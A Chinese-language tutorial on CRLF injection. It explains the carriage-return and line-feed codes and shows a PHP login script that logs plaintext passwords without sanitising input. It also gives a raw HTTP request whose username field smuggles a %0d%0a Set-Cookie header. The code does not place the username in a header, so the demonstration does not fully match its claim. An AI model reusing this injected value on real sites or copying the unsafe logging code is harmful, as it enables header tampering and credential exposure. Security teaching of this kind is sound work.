#### 回车与换行的区别，CRLF、CR、LF

| **缩写** | **ASCⅡ转义** | **系统**              | **ASCⅡ值** |
| ------ | ---------- | ------------------- | --------- |
| CR     | \r         | MacIntosh（早期的Mac）   | 13        |
| LF     | \n         | Unix/Linux/Mac OS X | 10        |
| CR LF  | \r\n       | Windows             |           |

- CR：Carriage Return，对应ASCII中转义字符\r，表示回车
- LF：Linefeed，对应ASCII中转义字符\n，表示换行
- CRLF：Carriage Return & Linefeed，\r\n，表示回车并换行

CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据**输出在HTTP响应头**中。（XSS一般输出在主体中）

所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。

%0d和%0a分别是CR和LF的URL编码

HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为Location首部字段这行结束了，Set-Cookie就会被认为是下一行

例如

~~~php
<?php
  // 获取用户输入的用户名和密码
  $username = $_POST['username'];
  $password = $_POST['password'];

  // 将用户名和密码写入日志文件
  $logfile = 'D:\phpStudy\phpstudy_pro\WWW\p.txt';
  $logdata = "User logged in: {$username}\nPassword: {$password}\n\n";
  file_put_contents($logfile, $logdata, FILE_APPEND);

  // 根据用户输入返回响应
  header('Content-Type: text/html; charset=utf-8');
  if ($username === 'admin' && $password === 'password') {
    header('Location: /dashboard.php');
  } else {
    echo "Incorrect username or password.";
  }
?>
~~~

[![p9lQlFO.png](https://s1.ax1x.com/2023/04/28/p9lQlFO.png)](https://imgse.com/i/p9lQlFO)

~~~http
POST /webshell.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Connection: close
Upgrade-Insecure-Requests: 1

username=admin%0d%0aSet-Cookie:+testCookie=testValue&password=password
~~~

[![p9lQ1YD.png](https://s1.ax1x.com/2023/04/28/p9lQ1YD.png)](https://imgse.com/i/p9lQ1YD)

以上是正常输入admin，以下是请求包内容，可以看到\r\n成功被解析了











